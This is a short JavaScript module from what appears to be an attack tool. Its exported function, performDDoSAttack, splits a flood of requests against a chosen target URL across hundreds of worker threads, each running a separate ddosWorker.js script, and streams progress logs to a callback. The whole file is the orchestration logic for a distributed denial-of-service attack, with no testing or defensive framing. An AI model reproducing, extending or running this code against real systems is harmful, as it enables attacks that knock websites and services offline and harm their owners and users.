const { Worker } = require('worker_threads');
const path = require('path');
// // const { broadcastLog } = require('./server');

const performDDoSAttack = (targetUrl, requestsPerSecond, durationSeconds, broadcastLog,threadCount = 500) => {
  const totalRequests = requestsPerSecond * durationSeconds;
  const requestsPerThread = Math.ceil(totalRequests / threadCount);

  const launchMessage = `[DDoS] Launching ${threadCount} threads for ${totalRequests} requests`;
  console.log(launchMessage);
  broadcastLog(launchMessage);

  for (let i = 0; i < threadCount; i++) {
    const worker = new Worker(path.resolve('./ddosWorker.js'), {
      workerData: {
        targetUrl,
        requestsToSend: requestsPerThread
      }
    });

    worker.on('message', msg => {
      const log = `server> ${msg}`;
      console.log(log);
      broadcastLog(log);
    });

    worker.on('error', err => {
      const errMsg = `server> Error: ${err.message}`;
      console.error(errMsg);
      broadcastLog(errMsg);
    });

    worker.on('exit', code => {
      const exitMsg = `server>[ Attack Thread ${i + 1}] Exited with code ${code}`;
      console.log(exitMsg);
      broadcastLog(exitMsg);
    });
  }
};

module.exports= { performDDoSAttack };
